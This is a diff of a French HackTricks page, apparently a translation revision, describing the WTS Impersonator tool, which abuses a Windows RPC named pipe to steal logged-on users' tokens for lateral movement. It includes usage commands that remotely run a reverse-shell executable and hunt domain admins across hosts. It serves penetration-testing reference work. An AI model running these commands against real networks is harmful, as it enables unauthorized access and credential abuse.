@@ -7,12 +7,12 @@ Autres façons de soutenir HackTricks :
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
 
 </details>
 
-L'outil **WTS Impersonator** exploite le Named pipe RPC **"\\pipe\LSM_API_service"** pour énumérer discrètement les utilisateurs connectés et usurper leurs jetons, contournant ainsi les techniques traditionnelles d'usurpation de jetons. Cette approche facilite les mouvements latéraux au sein des réseaux. L'innovation derrière cette technique est attribuée à **Omri Baso, dont le travail est accessible sur [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.
+Le **WTS Impersonator** outil exploite le **"\\pipe\LSM_API_service"** RPC Named pipe pour discrètement énumérer les utilisateurs connectés et usurper leurs jetons, contournant les techniques traditionnelles d'usurpation de jetons. Cette approche facilite les mouvements latéraux transparents au sein des réseaux. L'innovation derrière cette technique est attribuée à **Omri Baso, dont le travail est accessible sur [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.
 
 ### Fonctionnalité principale
 L'outil fonctionne à travers une séquence d'appels API :
@@ -46,7 +46,7 @@ WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → 
 .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
 ```
 
-- **Module de Recherche d'Utilisateurs**: Cible des utilisateurs spécifiques sur plusieurs machines, exécutant du code sous leurs identifiants. Cela est particulièrement utile pour cibler les administrateurs de domaine ayant des droits d'administration locaux sur plusieurs systèmes.
+- **Module de Recherche d'Utilisateur**: Cible des utilisateurs spécifiques sur plusieurs machines, exécutant du code sous leurs identifiants. Cela est particulièrement utile pour cibler les administrateurs de domaine avec des droits d'administration locaux sur plusieurs systèmes.
 - Exemple d'utilisation :
 ```powershell
 .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
